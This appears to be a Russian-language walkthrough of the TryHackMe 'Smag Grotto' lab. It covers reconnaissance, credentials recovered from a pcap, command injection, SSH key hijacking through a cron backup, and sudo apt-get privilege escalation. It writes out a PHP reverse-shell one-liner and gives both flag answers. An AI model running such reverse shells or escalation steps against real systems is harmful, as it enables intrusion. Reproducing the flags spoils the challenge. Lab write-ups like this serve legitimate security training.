# TryHackMe: Smag Grotto

## Task 1: Smag Grotto
```sh
nmap -sC -sV 10.10.73.169
```

![ScreenShot](screenshots/1.png)

Мы нашли:
- 22 port - SSH (OpenSSH 7.2p2)
- 80 port - HTTP (Apache httpd 2.4.18)

Зайдем на сайт, который располагается на порте 80:

![ScreenShot](screenshots/2.png)

Попробуем найти другие директории сайта при помощи **dirsearch**:

![ScreenShot](screenshots/3.png)

Находим директорию **/mail**:

![ScreenShot](screenshots/4.png)

Среди всего прочего находим **.pcap** файл. Скачаем его и откроем в **Wireshark**:

![ScreenShot](screenshots/5.png)

Среди захваченных пакетов находим пакет, внутри которого находится POST-запрос с передаваемыми данными:
- "username" - "helpdesk"
- "password" - "cH4nG3M3_n0w"

![ScreenShot](screenshots/6.png)

Теперь вопрос заключается в правильности этих данных:

![ScreenShot](screenshots/7.png) 

Как видим, response code - 200, значит, при помощи этих данных кто-то смог авторизоваться на сайте. Также в разделе **Request URI** можно заметить доменное имя - **development.smag.thm**. Внесем его в файл **/etc/hosts**:
 
![ScreenShot](screenshots/8.png)

Перейдем теперь на сайт:

![ScreenShot](screenshots/9.png)

Подразумеваю, что для того, чтобы попасть на вкладку **admin.php**, нужно пройти аутентификацию на **login.php**. Данные для входа мы нашли ранее:

![ScreenShot](screenshots/10.png)

Вот мы и на странице **admin.php**:

![ScreenShot](screenshots/11.png)

Видим, что мы можем ввходить команды. Проверим это через Wireshark (на tun0). Попробуем произвести ping на нашу хостовую машину:

![ScreenShot](screenshots/12.png)

![ScreenShot](screenshots/13.png)

Как можно заметить, ICMP-запросы успешно получают от нас ответы. В таком случае пойдем дальше и попробуем реализовать reverse shell. Для начала поставим порт 4444 на прослушивание:

![ScreenShot](screenshots/14.png)

Сайт написан на php, поэтому php должен быть нам доступен. Формируем правильную команду:
```sh
php -r '$sock=fsockopen("<tun0 IP-address>",4444);exec("/bin/bash -i <&3>&3 2>&3");'
```

![ScreenShot](screenshots/15.png)

Запускаем команду к исполнению и видим, что она успешно отработала и вернула нам shell:

![ScreenShot](screenshots/16.png)

Как удалось выяснить далее, в системе присутствует пользователь **jake**. Первый флаг, находящийся в его директории нам пока что недоступен. 

![ScreenShot](screenshots/17.png)

Находим некие ключи в директории **/var/tmp**:

![ScreenShot](screenshots/18.png)

Но нас пока что это ни к чему толком не привело. Далее были просмотрены задачи в crontab:

![ScreenShot](screenshots/19.png)

Находим команду, которая из backup'а формирует ssh-ключи для пользователя **jake**. Собственно, надо подменить backup, чтобы оттуда подтягивалось то, что нам нужно. Проанализируем содержимое файла **/opt/.backups/jake_id_rsa.pub.backup**:

![ScreenShot](screenshots/20.png)

Попробуем заменить данный ключ на наш собственный. Первым, делом сгенерируем его:

![ScreenShot](screenshots/21.png)

![ScreenShot](screenshots/22.png)

Далее, изменим содержимое непосредственно в backup-файле:

![ScreenShot](screenshots/23.png)

Пробуем подключиться по SSH при помощи созданного нами ключа:

![ScreenShot](screenshots/24.png)

И да! Мы имеем доступ от имени пользователя jake, поэтому забираем первый флаг:

![ScreenShot](screenshots/25.png)

### Question 1: What is the user flag? - iusGorV7EbmxM5AuIe2w499msaSuqU3j

Далее посмотрим, какие команды мы можем выполнять относительно sudo:

![ScreenShot](screenshots/26.png)

Видим, что мы можем использовать **apt-get**. Посмотрим, возможно ли, используя данную команду получить привилегированный доступ (GTFORBins):

![ScreenShot](screenshots/27.png)

Применяем нужную нам команду и получаем root'а:

![ScreenShot](screenshots/28.png)

Забираем root-флаг:

![ScreenShot](screenshots/29.png)

### Question 2: What is the user root? - uJr6zRgetaniyHVRqqL58uRasybBKz2T
